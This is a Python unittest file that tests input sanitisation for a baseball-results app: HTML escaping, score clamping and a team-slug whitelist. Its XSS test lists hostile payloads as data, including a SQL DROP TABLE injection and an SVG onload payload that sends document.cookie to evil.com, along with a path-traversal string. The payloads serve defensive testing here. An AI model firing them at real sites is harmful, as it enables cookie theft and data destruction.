"""
Security & Input Sanitization Penetration Tests
Verifies robust protection against injection and client tampering.
"""

import unittest
import html
import re


class TestSecuritySanitizerPython(unittest.TestCase):
    def escape_html(self, text: str) -> str:
        # Strip dangerous inline handlers and javascript: pseudoprotocol
        stripped = re.sub(r'(?i)\bon\w+\s*=', 'data-blocked=', text)
        stripped = re.sub(r'(?i)javascript:', 'blocked:', stripped)
        return html.escape(stripped, quote=True).replace("/", "&#x2F;")

    def sanitize_score(self, val):
        if val is None or val == "":
            return None
        try:
            val_int = int(str(val).strip())
            if val_int < 0:
                return 0
            if val_int > 99:
                return 99
            return val_int
        except ValueError:
            return None

    def validate_team_slug(self, slug: str) -> str:
        whitelist = {"aguilas", "bravos", "cardenales", "caribes", "leones", "magallanes", "tiburones", "tigres"}
        clean = str(slug).lower().strip()
        return clean if clean in whitelist else "leones"

    def test_xss_injection_neutralization(self):
        """Verify that malicious script tags, onerror payloads and attributes are safely neutralized."""
        malicious_payloads = [
            "<script>alert('pwned')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:void(0)",
            "'; DROP TABLE mis_resultados; --",
            "<svg/onload=fetch('https://evil.com?c='+document.cookie)>"
        ]

        for payload in malicious_payloads:
            sanitized = self.escape_html(payload)
            self.assertNotIn("<script>", sanitized)
            self.assertNotIn("onload=", sanitized)
            self.assertNotIn("onerror=", sanitized)
            self.assertNotIn("javascript:", sanitized)
            if "<" in payload:
                self.assertIn("&lt;", sanitized)

    def test_score_bounds_clamping(self):
        """Verify baseball score bounds enforcement (0 to 99)."""
        self.assertEqual(self.sanitize_score("-10"), 0)
        self.assertEqual(self.sanitize_score("150"), 99)
        self.assertEqual(self.sanitize_score("5"), 5)
        self.assertIsNone(self.sanitize_score("invalid_str"))
        self.assertIsNone(self.sanitize_score(None))
        self.assertIsNone(self.sanitize_score(""))

    def test_team_slug_whitelist_enforcement(self):
        """Verify strict whitelist on team slugs to prevent path traversal or injection."""
        self.assertEqual(self.validate_team_slug("MAGALLANES"), "magallanes")
        self.assertEqual(self.validate_team_slug("../../evil"), "leones")
        self.assertEqual(self.validate_team_slug("yankees"), "leones")
        self.assertEqual(self.validate_team_slug("cardenales"), "cardenales")


if __name__ == "__main__":
    unittest.main()